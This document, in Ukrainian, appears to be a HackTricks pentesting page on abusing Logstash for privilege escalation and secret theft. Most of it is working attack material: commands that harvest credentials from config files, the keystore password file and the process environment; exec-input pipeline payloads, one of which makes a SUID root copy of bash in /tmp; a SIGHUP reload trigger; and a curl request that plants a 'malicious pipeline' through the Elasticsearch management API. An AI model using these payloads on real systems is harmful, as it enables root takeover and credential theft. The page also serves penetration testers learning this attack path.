# Підвищення привілеїв Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash використовується для **збирання, перетворення та надсилання логів** через систему, відому як **pipelines**. Ці pipelines складаються з етапів **input**, **filter** та **output**. Цікавий аспект виникає, коли Logstash працює на скомпрометованій машині.

### Конфігурація Pipeline

Pipelines налаштовуються у файлі **/etc/logstash/pipelines.yml**, де вказуються розташування конфігурацій pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Цей файл показує, де розташовані файли **.conf**, що містять конфігурації pipeline. Під час використання **Elasticsearch output module** поширено, що **pipelines** містять **Elasticsearch credentials**, які часто мають широкі привілеї, оскільки Logstash повинен записувати дані в Elasticsearch. Wildcards у шляхах конфігурації дають Logstash змогу виконувати всі pipeline, що відповідають заданому шаблону, у визначеній директорії.

Якщо Logstash запущено з `-f <directory>` замість `pipelines.yml`, **усі файли в цій директорії об’єднуються в лексикографічному порядку та аналізуються як єдина конфігурація**. Це створює 2 offensive implications:

- Доданий файл на кшталт `000-input.conf` або `zzz-output.conf` може змінити спосіб формування фінального pipeline
- Некоректний файл може перешкодити завантаженню всього pipeline, тому ретельно перевіряйте payloads, перш ніж покладатися на auto-reload

### Швидке перерахування на скомпрометованому хості

На host, де встановлено Logstash, швидко перевірте:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Також перевірте, чи доступний локальний monitoring API. За замовчуванням він прослуховує **127.0.0.1:9600**, чого зазвичай достатньо після отримання доступу до хоста:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Зазвичай це надає вам ID pipeline, деталі runtime і підтвердження того, що ваш змінений pipeline було завантажено.

Облікові дані, отримані з Logstash, часто відкривають доступ до **Elasticsearch**, тому перегляньте [цю іншу сторінку про Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Ескалація привілеїв через pipeline із правом запису

Щоб спробувати виконати ескалацію привілеїв, спочатку визначте користувача, від імені якого працює сервіс Logstash, зазвичай це користувач **logstash**. Переконайтеся, що виконується **одна** з цих умов:

- Ви маєте **право запису** до файлу pipeline **.conf** **або**
- Файл **/etc/logstash/pipelines.yml** використовує wildcard, а ви можете записувати до цільової папки

Крім того, має виконуватися **одна** з цих умов:

- Можливість перезапустити сервіс Logstash **або**
- У файлі **/etc/logstash/logstash.yml** встановлено `config.reload.automatic: true`

Якщо в конфігурації використовується wildcard, створення файлу, який відповідає цьому wildcard, дає змогу виконувати команди. Наприклад:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Тут **interval** визначає частоту виконання в секундах. У наведеному прикладі команда **whoami** запускається кожні 120 секунд, а її вивід перенаправляється до **/tmp/output.log**.

Якщо в **/etc/logstash/logstash.yml** встановлено **config.reload.automatic: true**, Logstash автоматично виявлятиме та застосовуватиме нові або змінені конфігурації pipeline без необхідності перезапуску. Якщо wildcard не використовується, наявні конфігурації все одно можна змінювати, але слід бути обережним, щоб уникнути збоїв.

### Надійніші Payload для Pipeline

Плагін вхідних даних `exec` досі працює в актуальних релізах і потребує або `interval`, або `schedule`. Він виконується шляхом **forking** JVM Logstash, тому за нестачі пам’яті ваш payload може завершитися з помилкою `ENOMEM`, а не запуститися непомітно.

Практичніший payload для підвищення привілеїв зазвичай залишає довговічний артефакт:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Якщо у вас немає прав на перезапуск, але ви можете надіслати сигнал процесу, Logstash також підтримує перезавантаження, ініційоване **SIGHUP**, у Unix-подібних системах:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Майте на увазі, що не кожен plugin підтримує reload. Наприклад, input **stdin** перешкоджає automatic reload, тож не припускайте, що `config.reload.automatic` завжди підхопить ваші зміни.

### Викрадення секретів із Logstash

Перш ніж зосереджуватися лише на code execution, зберіть дані, до яких Logstash уже має доступ:

- Облікові дані у відкритому вигляді часто жорстко задані всередині output `elasticsearch {}`, `http_poller`, JDBC inputs або налаштувань, пов’язаних із cloud
- Захищені налаштування можуть зберігатися в **`/etc/logstash/logstash.keystore`** або в іншій директорії `path.settings`
- Пароль keystore часто передається через **`LOGSTASH_KEYSTORE_PASS`**, а інсталяції на основі пакетів зазвичай отримують його з **`/etc/sysconfig/logstash`**
- Розгортання змінних середовища через `${VAR}` виконується під час запуску Logstash, тому варто перевірити environment service

Корисні перевірки:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Це також варто перевірити, оскільки **CVE-2023-46672** показала, що за певних обставин Logstash міг записувати конфіденційну інформацію в логи. На post-exploitation хості старі логи Logstash і записи `journald` можуть тому розкривати облікові дані, навіть якщо поточна конфігурація посилається на keystore, а не зберігає секрети безпосередньо.

### Зловживання централізованим керуванням pipeline

У деяких середовищах хост взагалі **не використовує локальні `.conf`-файли**. Якщо налаштовано **`xpack.management.enabled: true`**, Logstash може отримувати централізовано керовані pipeline з Elasticsearch/Kibana, і після ввімкнення цього режиму локальні конфігурації pipeline більше не є джерелом істини.

Це означає інший шлях атаки:

1. Отримати облікові дані Elastic із локальних налаштувань Logstash, keystore або логів
2. Перевірити, чи має обліковий запис кластерний привілей **`manage_logstash_pipelines`**
3. Створити або замінити централізовано керований pipeline, щоб хост Logstash виконав ваш payload під час наступного інтервалу опитування

API Elasticsearch, який використовується для цієї функції:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Це особливо корисно, коли локальні файли доступні лише для читання, але Logstash уже зареєстрований для віддаленого отримання pipeline.

## References

- [Документація Elastic: перезавантаження конфігураційного файлу](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Документація Elastic: налаштування централізованого керування pipeline](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
